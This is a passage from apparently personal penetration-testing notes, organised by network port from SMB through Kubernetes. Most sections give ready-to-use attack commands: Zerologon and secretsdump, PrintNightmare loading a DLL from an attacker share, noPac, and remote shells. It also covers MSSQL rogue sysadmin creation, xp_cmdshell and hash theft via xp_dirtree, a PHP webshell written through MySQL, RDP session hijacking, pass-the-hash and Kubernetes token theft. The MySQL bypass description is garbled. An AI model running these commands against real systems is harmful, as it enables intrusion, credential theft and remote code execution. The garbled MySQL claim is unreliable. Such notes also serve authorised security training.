	    - ` cd ~/TOOLS/CVE-2020-1472`
	    - `python3 cve-2020-1472-exploit.py [DC_NBT_NAME] [DC_IP]`
	    - `secretsdump.py -no-pass [DOMAIN]/'[DC_NBT_NAME]$'@[DC_IP] -just-dc`
	    - `python restorepassword.py [DC_AUTH_STRING] -target-ip [DC_IP] -hexpass [DUMPED_DC_HEX_PASS]`
	- [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675.git)
	    - `CVE-2021-1675.py [AUTH_STRING] '\\[KALI_IP]\Share\evil.dll'`
	- [NoPAC](https://github.com/Ridter/noPac.git)
		- Requires Domain Account SMB Credentials (no Guest or null)
	    - `noPac.py [domain/]username[:password] -shell --impersonate Administrator -use-ldap`

### RCE & Shell (Local Admin)
Requires writable `$` Shares, confirm with `(Pwn3d!)` in nxc output
- `nxc smb [IP] [AUTH] -x [CMD]`
- Interactive shell -> local auth with machine name instead of domain
	- `psexec.py domain/username:password@[IP]`
	- `smbexec.py domain/username:password@[IP]`
	- `atexec.py domain/username:password@[IP]`
	- `wmiexec.py domain/username:password@[IP]`

## 143, 993 IMAP

### Generalities:

**Type:** Email receiving

- Purpose:
  - Access emails from a mail server
  - Allows online management on the server (supports folders)
  - Authentication to the desire mailbox
  - No-encryption: transmits commands, emails, or usernames and passwords in plain text.
  - SSL/TLS to require an encrypted session (on the higher port if present)

### Configuration

In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.

**Dangerous Settings:**

| **Setting**               | **Description**                                              |
| ------------------------- | ------------------------------------------------------------ |
| `auth_debug`              | Enables all authentication debug logging.                    |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons. |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated. |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |

### Interaction

- nmap will return the available commands that can be executed

- If we discover the credentials:

  ```bash
  curl -k 'imaps://[IP]' --user user:password -v
  ```

  -  `verbose` (`-v`) we can see the version of TLS used for  encryption, further details of the SSL certificate, and even the banner, which could contain the version of the mail server.

- To connect via openssl (also `netcat` is possible):

  ```bash
  openssl s_client -connect [IP]:imaps
  ```

```bash
# Login
    A1 LOGIN username password
Values can be quoted to enclose spaces and special characters. A " must then be escape with a \
    A1 LOGIN "username" "password"

# List Folders/Mailboxes
    A1 LIST "" *
    A1 LIST INBOX *
    A1 LIST "Archive" *

# Create new Folder/Mailbox
    A1 CREATE INBOX.Archive.2012
    A1 CREATE "To Read"

# Delete Folder/Mailbox
    A1 DELETE INBOX.Archive.2012
    A1 DELETE "To Read"

# Rename Folder/Mailbox
    A1 RENAME "INBOX.One" "INBOX.Two"

# List Subscribed Mailboxes
    A1 LSUB "" *

#Status of Mailbox (There are more flags than the ones listed)
    A1 STATUS INBOX (MESSAGES UNSEEN RECENT)

# Select a mailbox
    A1 SELECT INBOX

# List messages
    A1 FETCH 1:* (FLAGS)
    A1 UID FETCH 1:* (FLAGS)

# Retrieve Message Content
    A1 FETCH 2 body[text]
    A1 FETCH 2 all
    A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])

# Close Mailbox
    A1 CLOSE

# Logout
    A1 LOGOUT
```
## 161u - SNMP

### Generalities

**Type:** Database

- Purpose:
  - monitor network devices
  - handle configuration tasks and change settings remotely
  - SNMP-enabled hardware includes routers, switches, servers, IoT devices...
  - Sends traps over UDP port 161: data packets sent from the SNMP server to the client without  being explicitly requested. If a device is configured accordingly, an  SNMP trap is sent to the client once a specific event occurs on the  server-side. For the SNMP client and server to exchange the respective values, the  available SNMP objects must have unique addresses known on both sides. 
- MIB
  - Text file in which all queryable SNMP objects of a device are listed as a tree
  - It contains at least one `Object Identifier` (`OID`) (a node in the tree, uniquely identified by a sequence of numbers), which, in addition to the necessary unique address and a name, also  provides information about the type, access rights, and a description of the respective object.
- Authentication and Encryption
  - Only in version 3 we have encryption and authentication via user:pass
  - Community strings: in v2, determine whether the requested information can be viewed or not, thus can be seen as passwords

### Configuration

  - All the settings in the [manpage](http://www.net-snmp.org/docs/man/snmpd.conf.html).

  - `cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'`

  - Dangerous Settings:

	| **Settings**                                     | **Description**                                              |
    | ------------------------------------------------ | ------------------------------------------------------------ |
    | `rwuser noauth`                                  | Provides access to the full OID tree without authentication. |
    | `rwcommunity <community string> <IPv4 address>`  | Provides access to the full OID tree regardless of where the requests were sent from. |
    | `rwcommunity6 <community string> <IPv6 address>` | Same access as with `rwcommunity` with the difference of using IPv6. |

### Interaction

1. Query the OIDs with their information

   ```bash
   snmpwalk -v2c -c public [IP]
   ```

2. Brute-force community strings (if version 1,2)

   ```bash
   onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt [IP]
   ```

    [crunch](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create custom wordlists

3. Brute-force OIDs after a community string is known

   ```bash
   braa <community string>@<IP>:.1.3.6.*
   ```

## 194,6667,6660-7000 IRC
### Enumeration
```bash
weechat
```
```pgsql
/server add htb <target_ip> 6667
/connect htb
```
## 389, 636, 3268 LDAP
### Enumeration

1. nxc to get / verify credentials 

	```bash
	nxc ldap [IP] -u user.txt -p pass.txt
	```

2. Users
	```bash
	nxc ldap [IP] [AUTH_STRING] --query "(|(sAMAccountType=805306368)(sAMAccountType=805306369))" "sAMAccountName description info memberOf useraccountcontrol"
	```
3. Save the users -> `| grep "sAMAccountName" | awk '{print $6}'`
4. Memberships
	```bash
	nxc ldap [IP] [AUTH_STRING] --groups 'GROUP_NAME'
	```
	- Remote Desktop Users (RDP Access)
	- Remote Management Users (WinRM Access)
	- Distributed COM Users (DCOM Access)
	- Other Privileged Groups in Local Escalation
5. Password Policy:
   ```bash
	ldapsearch -h [IP]-x -b "[Domain_Dist_Name]" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
	```
6. Dump the database

	```bash
	ldapdomaindump -u $username -p $password -o $output_dir [dc-ip-address]
	```

	- Users and Descriptions
		```bash
		cat domain_users.json | grep -i samaccountname -A1 | grep -vi samaccountname | grep -v - | tr -d '"' | tr -d ' ' > ~/machines/user.txt
		```

		```bash
		cat domain_users.json| grep -Ei 'info|description' -A1
		```

	- Groups - Search for the users you compromised, check interesting memberships
		```bash
		firefox domain_users_by_group.html
		```
7. DNS Dumping
- `bloodyAD --host [DC_FQDN] [AUTH_STRING] get dnsDump`
- `adidnsdump -u [DOM_BASE]\\[USER] ldap://[DC_IP]`
- Enumeration of DNS Records
6. (AD) Bloodhound 
	```bash
	nxc ldap [DC_FQDN] -u [USER] -p [PASS] --dns-tcp --dns-server [DC_IP] --bloodhound --collection All
	```
	```bash
	bloodhound-python -u usr -p pwd -d domain -dc DC01 -ns ip --dns-tcp -c All --zip
	```
	```powershell
	Invoke-BloodHound -CollectionMethods All
	```
	```cmd
	./SharpHound.exe -c all
	```
	- Open the ZIP file inside Bloodhound
#### LDAP Sniffing

- Open an LDAP server and sniff credentials via some connection test conmands
- `sudo nc -k -v -l -p 386`
- [SLAPD Server Alternative](https://grimhacker.com/2018/03/09/just-a-printer/)
- Run Connection Test on Printer/Server â†’ Capture Credentials

## 500U - Ipsec/IKE VPN
- VPN / Remote access
### Enumeration
```bash
nscan -> ike
```
```bash
ike-scan -M --showbackoff [IP] {--trans [TRASFORMATION]}
```
- `AUTH` field
	- `PSK` -> preshared key
- Value of the last line
	- **0 returned handshake; 0 returned notify: ** not an IPsec gateway.
	- **1 returned handshake; 0 returned notify:** IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable (a valid transform will be shown in the output).
	- **0 returned handshake; 1 returned notify:** VPN gateways respond with a notify message when none of the transforms are acceptable -> brute force transformation
- Get the vendor
- Find group ID e.g. `ike@expressway.htb`
	- Sniffing -> nmap modules
	  - `{bash}sudo python3 ~/TOOLS/iker.py --fullalgs --clientids /usr/share/seclists/Miscellaneous/ike-groupid.txt [IP]`
- Get the hash
  `{bash} ike-scan -M -A -n [ID] --pskcrack=hash.txt [IP]`

### Generalities

- **Type:** Authentication

- `r-services` were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (`SSH`) 

### Exploit

-  man-in-the-middle (`MITM`) attacks.

### Configuration

- The `/etc/hosts.equiv` (global configuration) and `.rhosts` (per user configuration) file contains a list of trusted hosts, which are granted access without authentication.

- Additionally, the `+` modifier can be used within these files as a wildcard to specify anything.

  

### Interaction

| **Command**                | **Service Daemon** | **Port** | **Description**                                              |
| -------------------------- | ------------------ | -------- | ------------------------------------------------------------ |
| `rcp` (remote copy)        | `rshd`             | 514      | Copy a file or directory bidirectionally. No warning for overwriting existing files. |
| `rsh` (remote shell)       | `rshd`             | 514      | Opens a shell without login. Relies upon the trusted entries in the `hosts.equiv` and `.rhosts` files. |
| `rexec` (remote execution) | `rexecd`           | 512      | Runs shell commands. Requires authentication Authentication or the trusted entries in the `hosts.equiv` and `.rhosts` files. |
| `rlogin` (remote login)    | `rlogind`          | 513      | Logs in, through Authentication or the trusted entries in the `hosts.equiv` and `.rhosts` files. |

After Login:

- `rho [IP]`

  Lists all interactive sessions on the local network. The daemon periodically broadcasts information about logged-on users, so it might be beneficial to watch the network traffic.

- `ruser -al [IP]`

  Gives a more detailed account of all logged-in users over the network

## 623u - IPMI

### Generalities

- **Type:**
- Purpose:
  - manage and monitor systems even if they are powered off or in an unresponsive state
  -  remote upgrades
  - Before the OS has booted to modify BIOS settings
  - When the host is fully powered down
  - Access to a host after a system failure
  - querying inventory information, reviewing hardware logs, and alerting using SNMP.
- Structure
  - The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.
  - Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs).
  - If we can access a BMC during an assessment, we would gain full access  to the host motherboard and be able to monitor, reboot, power off, or  even reinstall the host operating system. 


### Configuration

- Some unique default passwords

  | Product         | Username      | Password                                                     |
  | --------------- | ------------- | ------------------------------------------------------------ |
  | Dell iDRAC      | root          | calvin                                                       |
  | HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
  | Supermicro IPMI | ADMIN         | ADMIN                                                        |

### Exploit

- IPMI 2.0

  During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes  place. This can be leveraged to obtain the password hash for ANY valid  user account on the BMC. 

  - Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) module.

    ```bash
    msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
    msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts [IP]
    ```

  -  In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command

     `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` 

    which tries all combinations of upper case letters and numbers for an eight-character password.

### Interaction

- nmap sctipt

- metasploit version scan

  ```shell
  msf6 > use auxiliary/scanner/ipmi/ipmi_version 
  ```


## 873 - Rsyinc

### Generalities

- [Rsync](https://linux.die.net/man/1/rsync) is a fast and efficient tool for locally and remotely copying files.
- This [guide](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync) covers some of the ways Rsync can be abused (sometimes also without authentication)

### Interaction

```bash
rsync -av --list-only rsync://[IP]/[SHARE]
```

-  If Rsync is configured to use SSH to transfer files, we could modify our commands to include the `-e ssh` flag, or `-e "ssh -p2222"` if a non-standard port is in use for SSH.

- To read: `rsync -av --list-only rsync://{HOST}/`

- To copy: `rsync -av rsync://{HOST}/{module} [YOUR DIRECTORY]`

## 1433 - MSSQL

### Generalities

- **Type: ** Database

- Purpose:
  - closed source and was initially written to run on Windows
  - Many other clients can be used to access msSQL, such as
    - [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)
    - [SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15)
    - [HeidiSQL](https://www.heidisql.com)
    - [SQLPro](https://www.macsqlclient.com)
    - [Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)

-  Structure

   | Default Database | Description                                                  |
   | ---------------- | ------------------------------------------------------------ |
   | `master`         | Tracks all system information for an SQL server instance     |
   | `model`          | Acts as a structure for every new database  created. Any setting changed in the model database will be reflected in  any new database created after |
   | `msdb`           | The SQL Server Agent uses this database to schedule jobs & alerts |
   | `tempdb`         | Stores temporary objects                                     |
   | `resource`       | Read-only database containing system objects included with SQL server |

### Configuration

- Initially, the SQL service will likely run as `NT SERVICE\MSSQLSERVER`.
- **Dangerous settings**
  - Not using encryption to connect
  - The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
  - The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
  - Weak & default `sa` credentials. 

### Interaction

- **Linux auth:**

  If credentials are known:

  ```bash
  mssqlclient.py [domain]/[USER]@[IP] -windows-auth
  ```

- **Windows Authentication** 

  - Usinf `sqsh`:

    ```cmd
    sqsh -S 10.129.20.13 -U username -P pass
    ```

  - To connect with windows authentication:

    ```cmd
    sqlcmd -S localhost -E
    ```

  - with the server authentication;

    ```cmd
    sqlcmd -S localhost -U your_username -P your_password 
    ```

  - The interaction is the same as below, but you need to run `GO` after every command.

- **Default credentials:** `sa` and empty passwd 

```bash
# Get Server Name
SELECT @@SERVERNAME AS ServerName;
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#Read tables
SELECT * FROM yourTableName;
#Read a specific row with a certain column value
SELECT * FROM yourTableName WHERE columnName = 'specificValue';
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links
#Use a link
use_link [NAME]

# Execute commands (if enabled)
xp_cmdshell "whoami"
# Enable xp_cmdshell (with appropriate privileges) impacket:
enable_xp_cmdshell
# Enable from Windows:
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

### Exploit

- **Write**

  To write files, [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) must be enabled:

  ```bash
  # Enable Ole to write files
  sp_configure 'show advanced options', 1
  RECONFIGURE
  sp_configure 'Ole Automation Procedures', 1
  RECONFIGURE
  ```

  - [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), 

  - [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), 
  - [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15),
  -  [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). 

- **Read Local files**

  ```bash
  SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
  ```

- The `xp_regwrite` command is used to elevate privileges by creating new entries in the Windows registry.
- **Read Local Directories**
	```mssql
	xp_dirtree C:\
	```
- **Capture Hashes**

  1. Start `responder` or `impacket-smbserver`

     ```bash
     sudo responder -I tun0
     ```

     ```bash
     sudo impacket-smbserver share ./ -smb2support
     ```

  2. Hash stealing

     ```bash
     EXEC master..xp_dirtree '\\[RESPONDER IP]\share\'
     
     EXEC master..xp_subdirs '\\[RESPONDER IP]\share\'
     ```
     
  3. Crack the Hash (whole)

  4. If cracking doesn't work, relay

- **IMPERSONATE to Privesc**  

   Sysadmins can impersonate anyone by default.

  ```bash
  # Identify which Users we can impersonate
  SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
  GO
  
  # Impersonate an User (e.g. sa) - Recommended within the master DB 
  EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
  GO
  
  # Revert the operation and return to our previous user
  REVERT
  ```
  
- **Communicate with other DB**

  If we manage to gain access to a SQL Server with a linked server  configured, we may be able to move laterally to that database server. 

  ```bash
  # Identify linked Servers (0 is a linked server)
  SELECT srvname, isremote FROM sysservers
  
  # Execute command in the linked server
  EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [[LINKED SERVER]]
  # The output will be 4 numbers, 0 for False and 1 for True
  # If you need quotes in the EXECUTE command, use double quotes inside
  ```
  
### Shell
if xp_shell is enabled, you can 
- send a rev shell 
- use metsploit: 
	- `search mssql_payload`

## 1521 - ORACLE

### Generalities

- **Type:**
- Purpose:
  - communication protocol that facilitates communication between Oracle databases and applications over networks.
- Structure
  - Can support `SSL/TLS` encryption
  -  it enables encryption between client and server communication through  an additional layer of security over the TCP/IP protocol layer.
  - Supports `IPv6`
  - The TNS listener listens for incoming connections in the port.
    - it will only accept connections from authorized hosts
    - it performs basic authentication using a combination of hostnames, IP  addresses, and usernames and passwords. 
    - It uses Oracle Net Services to encrypt the communication between the client  and the server.
  - a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. 
  - An instance is a set of processes and memory structures that interact to manage the database's data.

### Configuration

- Oracle TNS configuration files, located in the `$ORACLE_HOME/network/admin` directory:

  - `tnsnames.ora`

    Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service:  name for the service, network location, and database or service name.

  - `listener.ora`

    server-side configuration file that defines the listener process's properties and parameter

- Password:

  - Oracle 9 has a default password, `CHANGE_ON_INSTALL`,
  - Oracle 10 has no default password set. 
  - The Oracle DBSNMP service also uses a default password, `dbsnmp` 

- `PlsqlExclusionList`

  user-created text file that needs to be placed in `$ORACLE_HOME/sqldeveloper`, containing the names of PL/SQL packages or types that  should be excluded from execution. It serves as a  blacklist that cannot be accessed through the Oracle Application Server.

  | **Setting**          | **Description**                                              |
  | -------------------- | ------------------------------------------------------------ |
  | `DESCRIPTION`        | name for the database and its connection type.               |
  | `ADDRESS`            | Network address of the database (hostname port)              |
  | `PROTOCOL`           | protocol used for communication with the server              |
  | `PORT`               | The port used for communication with the server              |
  | `CONNECT_DATA`       | Specifies the attributes of the connection, s.a. the service name or SID, protocol, and database instance identifier. |
  | `INSTANCE_NAME`      | The name of the database instance the client wants to connect. |
  | `SERVICE_NAME`       | The name of the service that the client wants to connect to. |
  | `SERVER`             | The type of server used for the database connection, such as dedicated or shared. |
  | `USER`               | The username used to authenticate                            |
  | `PASSWORD`           | The password used to authenticate                            |
  | `SECURITY`           | The type of security for the connection.                     |
  | `VALIDATE_CERT`      | Whether to validate the certificate using SSL/TLS.           |
  | `SSL_VERSION`        | The version of SSL/TLS to use for the connection.            |
  | `CONNECT_TIMEOUT`    | The time limit in seconds for the client to establish a connection to the database. |
  | `RECEIVE_TIMEOUT`    | The time limit in seconds for the client to receive a response from the database. |
  | `SEND_TIMEOUT`       | The time limit in seconds for the client to send a request to the database. |
  | `SQLNET.EXPIRE_TIME` | The time limit in seconds for the client to detect a connection has failed. |
  | `TRACE_LEVEL`        | The level of tracing for the database connection.            |
  | `TRACE_DIRECTORY`    | The directory where the trace files are stored.              |
  | `TRACE_FILE_NAME`    | The name of the trace file.                                  |
  | `LOG_FILE`           | The file where the log information is stored.                |

### Interaction

If the client does not specify a SID, the default value defined in the `tnsnames.ora` file is used.

- Guess the `SID`

  - `nmap` brute forcing script

  - Oracle Database Attacking Tool (`ODAT`)

    ```bash
    ./odat.py all -s [IP]
    ```

- Log in

  ```bash
  sqlplus [USER]/[PASSWD]@[IP]/[SID]
  ```

- Log in as the System Database Admin (`sysdba`)

  ```bash
  sqlplus [USER]/[PASSWD]@[IP]/[SID] as sysdba
  ```

- Commands

  -   [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) 
  - `select table_name from all_tables;`  list all available tables in the current database
  - `select * from user_role_privs;` show the privileges of the current user
  - `select name, password from sys.user$;` retrieve the password hashes

- Test if a File Upload is possible (e.g on Win)

  ```bash
  $ echo "Oracle File Upload Test" > testing.txt
  $ ./odat.py utlfile -s [IP] -d [SID] -U [USER] -P [PASSWD] --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
  $ curl -X GET http://[IP]/testing.txt	# Check if it worked
  ```

- Upload a shell (if a web server is run) to the root directory

  - Linux `/var/www/html`
  - Windows `C:\inetpub\wwwroot`

## 3306 - MySQL

### Generalities

**Type:** Database

- Purpose:

  - Open-source SQL relational database management system developed and supported by Oracle.
  - The MySQL clients can retrieve and edit the data
  - Ideally suited for applications such as *dynamic websites*
  - A MySQL database translates the commands internally into executable code and performs the requested actions.

- Structure:

  - The data is stored in tables with different columns, rows, and data types.

  - often stored in a single file with the file extension `.sql`

### Configuration

`/etc/mysql/mysql.conf.d/mysqld.cnf`


### Interaction

- Linux: (try both logins)

  ```bash
  mysql -h [IP] -u root -p[PASSWD] --skip-ssl-verify-server-cert
  ```

- Windows:

  ```cmd
  mysql.exe -u [USER] -p[PASS] -h [IP]
  ```

- `dbeaver` (multi platform app)

The most important databases for the MySQL server are the `system schema` (`sys`) and `information schema`. The system schema contains tables, information, and metadata necessary  for management, see the [reference manual](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The mysql schema is the,used for other operational purposes) of MySQL. The information schema also contains metadata, but has less information than the previous one.

```sql
# ENUMERATION

# Get version
select version(); or select @@version;
# Show all databases.
show databases;
# Select one of the existing databases.
use <db>;
# Show all available tables in the selected database.
show tables;
# Show the columns of a selected table.
show columns from tabl;
# Show everything in the desired table.
select * from tabl {ORDER BY clumn};
# Show everything in a table in another database.
select * from other_db.tabl;
# Search for a condition in the desired table (AND &&, OR ||", NOT !).
SELECT * FROM tabl WHERE colum = "string";
SELECT * FROM tabl WHERE clm LIKE 'admin%';		# starting with admin
SELECT * FROM tabl WHERE clm LIKE 'admin---';	# "" of lenght +3

# CHANGING VALUES

# Insert a record in table
INSERT INTO table_name VALUES (column1_value, column2_value, ...);
# Update specific records based on conditions
UPDATE table_name SET column1=newvalue1,... WHERE <condition>;


```

### Exploits

- SQL injection

- **Write**

  - [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). 

  - If connected to a web server:

    - Check read/write privileges

      ```bash
      show variables like "secure_file_priv";
      ```

      - If empty, the variable has no effect, which is not a secure setting.
      - If set to the name of a directory, the server limits import and export operations to work only with files in that directory.
      - If set to NULL, the server disables import and export operations.

    - Write a file in the webserver directory 

      ```bash
      SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
      ```

    - Browse to the location where the file is and execute our commands.

- **Read Local Files** (not allowed by default)

  ```bash
  select LOAD_FILE("/etc/passwd");
  ```

- **Authentication bypass v5.6.x**

  The server takes longer to respond to an incorrect password than to a  correct one. Thus, repeatedly authenticate with the same  incorrect password, will work.

## 3389tu - RDP

### Generalities

- **Type:** Authentication (remote)
- It opens a live session
- Structure:
  - typically utilizing TCP port 3389 as the transport protocol,  the connectionless UDP protocol can use port 3389 also for remote  administration.
  - For an RDP session to be established, both the network firewall and the  firewall on the server must allow connections from the outside.
  - all data, and especially the login process, is protected in the network  by its good encryption. However, many Windows systems do not insist on  this but still accept inadequate encryption.

### Interaction

- [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) can unauthentically identify the security settings of RDP servers based on the handshakes.

  ```bash
  ./rdp-sec-check.pl [IP]
  ```

- Authentication and connection to such RDP servers can be made, for example, using `xfreerdp`, `rdesktop`, or `Remmina` 

  ```bash
  xfreerdp /u:[USER] /p:"[PASSWD]" /v:[IP]
  ```

### Exploit

- The identity-providing certificates are merely self-signed by default, so the client cannot distinguish a genuine certificate from a forged one and generates a certificate warning for the user.

- **Session Hijacking** (*no longer works on Server 2019*)

  Go from one user to another

  - Get active users with `query user` 

  - If you have SYSTEM privileges (or if you are admin and you can run the terminal as Administrator by right click):

    ```cmd
    tscon [TARGET_SESSION_ID] /dest:[OUR_SESSION_NAME]
    ```

  - If have Administrator privileges:

    1. Create a service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges.

       ```cmd
        sc.exe create service binpath= "cmd.exe /k tscon [TARGET_SESSION_ID] /dest:[OUR_SESSION_NAME]"
       ```

    2. Start the service

       ```cmd
       net start service
       ```

- **Pass-the-Hash (PtH)**

  Login using only the hash

  1. Enable `Restricted Admin Mode`

     ```cmd
     reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
     ```

  2. ```cmd
     xfreerdp /v:[IP] /u:[USER] /pth:[HASH]
     ```

- **BlueKeep (RCE without Auth) **[CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)

## 3632 distccd

**Distcc** is a tool that enhances the **compilation process** by utilizing the **idle processing power** of other computers in the network. When **distcc** is set up on a machine, this machine is capable of distributing its **compilation tasks** to another system. This recipient system must be running the **distccd daemon** and must have a **compatible compiler** installed to process the sent code.

Check if it's vulnerable to **CVE-2004-2687** to execute arbitrary code:

```bash
nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
```

## 5000 - Docker Registry

### Generalities

- Purpose:

  Docker images are organized within **Docker repositories** in the registry, each repository storing various versions of a specific image. The functionality provided allows for images to be downloaded  locally or uploaded to the registry, assuming the user has the necessary permissions.

## 5800,5801,5900,5901 - VNC

### Enumeration

```
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> <IP>
msf> use auxiliary/scanner/vnc/vnc_none_auth
```
### Decrypting VNC password

Default password is stored in: ~/.vnc/passwd

If you have the VNC password and it looks encrypted (a few bytes, like if it could be and encrypted password) use [vncpwd](https://github.com/jeroennijhof/vncpwd)

```
make
vncpwd <vnc password file>
```
### Interaction 

```
vncviewer [-passwd <passwword file>] <IP>::5901
```

## 5985-6 - WINRM

### Generalities

- **Type:** Authentication 
- Purpose:
  - remote management protocol based on the command line.
  - WinRM must be explicitly enabled and configured starting with Windows 10
  - Windows Remote Shell (`WinRS`), which lets us execute arbitrary commands on the remote system. The program is included on Windows 7 by default. 
- Structure:
  - WinRM relies on `TCP` ports `5985` and `5986` for communication, with the last port `5986 using HTTPS`, as ports 80 and 443 were previously used for this task. 
  - In general, it only works for active directories

### Interaction

 [evil-winrm](https://github.com/Hackplayers/evil-winrm) to log in

```bash
evil-winrm -i [IP] -u [USER] -p [PASSWD] {-S}
```

- Use `-S` to connect over ssl (5986 port)
- To upload /download files use `upload` and `download` in the winrm session. The file must be in the folder you used to connect to winrm.

### Exploit

The password is stored as an hash,  one-way function that takes any amount of data and returns a fixed size value.

Use responder to attack it: 

```
sudo responder -I tun0 -w -d 
```

it creates a fake shared folder in your network, that if it interacts with the attacked ip (e.g. through the parameter of a web page), will steal the password as an Hash.

The responder IP has to be loaded as a shared folder, i.e. `//<IP>/somefile`, if we want to do RFI.

## 6379 - REDIS

**Type:** Database

 `redis-cli -h [ip]`

Once inside redis environment `info` return information about the  server

- `Server` info: get version of redis
- `Keyspace` list of dictionaries (dictionaries) with statistics: number of keys, number of keys with expiration
- `select {index number of the database}`
- `keys *` List all the keys in the database
- `get {key}`

## 8443 Kubernetes

#### Generalities

Kubernetes revolves around the concept of **pods**, which can hold one or  more closely connected containers. Each pod functions as a separate  virtual machine on a node, complete with its own IP, hostname..

Kubernetes architecture is primarily divided into two types of components:

- The Control Plane (master node), which is responsible for controlling the Kubernetes cluster
- The Worker Nodes (minions), where the containerized applications are run

The Control Plane serves as the management layer. It consists of:

| **Service**             | **TCP Ports**  |
| ----------------------- | -------------- |
| `etcd`                  | `2379`, `2380` |
| `API server`            | `6443`         |
| `Scheduler`             | `10251`        |
| `Controller Manager`    | `10252`        |
| `Kubelet API`           | `10250`        |
| `Read-Only Kubelet API` | `10255`        |

The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions.

### Interaction

- Extract PODS info

  ```bash
   curl https://<IP>:10250/pods -k | jq .
   kubeletctl -i --server <IP> pods
   kubeletctl -i --server <IP> scan rce
  ```

- Execute commands

  ```bash
  kubeletctl -i --server <IP> exec "id" -p nginx -c nginx
  ```

- Gain acces

  ```bash
  # Extract token
  kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
  
  # Extract certificate
  kubeletctl --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
  
  # List privileges
  export token=`cat k8.token`
